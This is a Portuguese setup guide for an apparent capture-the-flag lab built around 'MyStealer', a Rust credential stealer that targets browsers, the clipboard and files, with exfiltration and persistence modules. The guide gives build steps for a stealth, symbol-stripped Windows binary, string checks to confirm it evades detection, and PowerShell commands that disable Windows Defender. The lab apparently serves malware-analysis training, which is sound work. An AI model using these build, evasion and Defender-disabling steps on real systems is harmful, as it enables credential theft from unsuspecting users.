# 🔧 Setup do Ambiente - MyStealer CTF Lab v0.3.1

## Pré-requisitos

### Sistema Host

- **OS**: Linux (Ubuntu 22.04+) ou Windows 10/11
- **RAM**: Mínimo 8GB (16GB recomendado)
- **Disco**: 50GB+ livres
- **CPU**: 4+ cores

### Software Necessário

- [Rust](https://rustup.rs/) 1.75+
- [Docker](https://docker.com/) & Docker Compose
- [Git](https://git-scm.com/)

---

## 1. Instalação Rápida

```bash
# Clonar o repositório
git clone https://github.com/Ermensonx/MyStealerLab.git
cd MyStealerLab

# Verificar Rust
rustc --version  # Deve ser 1.75+

# Build normal (com logs)
cargo build --release

# Build stealth (sem strings detectáveis)
cargo build --release --features "hydra-auto,silent"
```

---

## 2. Build Stealth para Windows (Docker)

O método recomendado para criar binários ofuscados:

```bash
# Build da imagem Docker
docker build -f Dockerfile.windows -t mystealer-stealth .

# Extrair o executável
mkdir -p output
docker run --rm -v $(pwd)/output:/output mystealer-stealth \
    sh -c "cp /app/target/x86_64-pc-windows-gnu/release/mystealer.exe /output/"

# Verificar tamanho e strings
ls -lh output/mystealer.exe
strings output/mystealer.exe | grep -iE "password|Chrome|Firefox|sandbox" | wc -l
# Deve retornar 0 ou muito poucos resultados (de bibliotecas)
```

### O que o Dockerfile faz:

```dockerfile
# RUSTFLAGS para máxima ofuscação
ENV RUSTFLAGS="-C panic=abort -C debuginfo=0 -C opt-level=z \
               -C lto=fat -C codegen-units=1 -C strip=symbols"

# Build com features de ofuscação
RUN cargo build --release --target x86_64-pc-windows-gnu \
    --features "hydra-auto,silent"

# Strip adicional
RUN x86_64-w64-mingw32-strip --strip-all mystealer.exe
```

---

## 3. Estrutura do Projeto

```
mysteellerCTF/
├── src/
│   ├── main.rs              # Entry point
│   ├── lib.rs               # Library exports
│   ├── config.rs            # Configuração
│   ├── collectors/          # Coletores (strings ofuscadas)
│   │   ├── mod.rs           # Trait + serde rename
│   │   ├── browser.rs       # Chrome, Firefox, Brave, Edge
│   │   ├── clipboard.rs     # Área de transferência
│   │   ├── files.rs         # Scanner de arquivos
│   │   └── system_info.rs   # Info do sistema
│   ├── crypto/              # Criptografia
│   ├── exfil/               # Exfiltração
│   ├── loader/              # Sistema Hydra
│   └── utils/               # Anti-analysis, helpers
├── challenges/              # 6 CTF challenges
├── docs/                    # Documentação
├── Dockerfile.windows       # Cross-compile com RUSTFLAGS
└── output/                  # Binários gerados
```

---

## 4. Features do Cargo

| Feature | Descrição | Uso |
|---------|-----------|-----|
| `lab-mode` | Verificações de segurança | Padrão |
| `hydra` | Sistema multi-processo | `--features hydra` |
| `hydra-auto` | Hydra automático | `--features hydra-auto` |
| `silent` | Remove logs/strings | `--features silent` |

### Combinações Comuns

```bash
# Desenvolvimento (com logs)
cargo build --release

# CTF (Hydra + logs)
cargo build --release --features hydra

# Stealth (sem strings detectáveis)
cargo build --release --features "hydra-auto,silent"
```

---

## 5. Ambiente de Laboratório

### Opção A: Docker (Rápido)

```yaml
# docker-compose.yml
version: '3.8'

services:
  mock-c2:
    image: python:3.11-slim
    command: python -m http.server 8080
    ports:
      - "8080:8080"
    volumes:
      - ./exfil_data:/data

  linux-target:
    image: ubuntu:22.04
    volumes:
      - ./target/release:/malware:ro
    tty: true
```

```bash
docker-compose up -d
docker-compose exec linux-target bash
```

### Opção B: VM Windows (Completo)

1. Baixar ISO do Windows 10/11
2. Criar VM no VirtualBox/VMware
3. Desabilitar Defender (apenas para lab)
4. Copiar `output/mystealer.exe`

```powershell
# Desabilitar Defender (PowerShell Admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
```

---

## 6. Verificação do Build

### Verificar Strings

```bash
# Contar strings sensíveis
strings output/mystealer.exe | grep -ciE "password|secret|credential|wallet|sandbox|vmware"
# Ideal: 0-2 (apenas de bibliotecas como argon2)

# Verificar nomes de browsers
strings output/mystealer.exe | grep -iE "Chrome|Firefox|Brave|Edge|Vivaldi"
# Ideal: 0

# Verificar queries SQL
strings output/mystealer.exe | grep -iE "SELECT.*FROM|cookies|history|logins"
# Ideal: Apenas queries internas do SQLite
```

### Verificar Tamanho

```bash
ls -lh output/mystealer.exe
# Esperado: ~3MB (com LTO e strip)
```

---

## 7. Executando

### Linux
```bash
# Modo normal
./target/release/mystealer --skip-checks --output-dir ./output

# Com Hydra (3 processos)
./target/release/mystealer --skip-checks --hydra
```

### Windows
```powershell
# Modo normal
.\mystealer.exe --skip-checks --output-dir .\output

# Com Hydra
.\mystealer.exe --skip-checks --hydra

# Verificar processos Hydra
Get-Process | Where-Object { $_.Name -eq "mystealer" }
```

---

## 8. Challenges CTF

Após o setup, explore os challenges:

| # | Challenge | Pontos |
|---|-----------|--------|
| 1 | Análise Estática | 40 |
| 2 | Análise Dinâmica | 60 |
| 3 | Criptografia | 80 |
| 4 | Evasion | 100 |
| 5 | Hydra Persistence | 120 |
| 6 | String Obfuscation | 100 |

**Total: 500 pontos**

---

## 9. Troubleshooting

### Erro: "cannot find -lsqlite3"
```bash
# Ubuntu/Debian
sudo apt install libsqlite3-dev

# Ou use rusqlite com bundled
# (já configurado no Cargo.toml)
```

### Erro: "mingw-w64 not found"
```bash
sudo apt install gcc-mingw-w64-x86-64
```

### Docker: Permissão negada
```bash
sudo chmod +x output/mystealer.exe
```

---

## ⚠️ Lembrete de Segurança

- **NUNCA** execute em sistemas reais
- **SEMPRE** use VMs isoladas
- **MANTENHA** snapshots das VMs
- **DESTRUA** as VMs após os testes

---

*Setup Guide - MyStealer CTF Lab v0.3.1* 🛡️
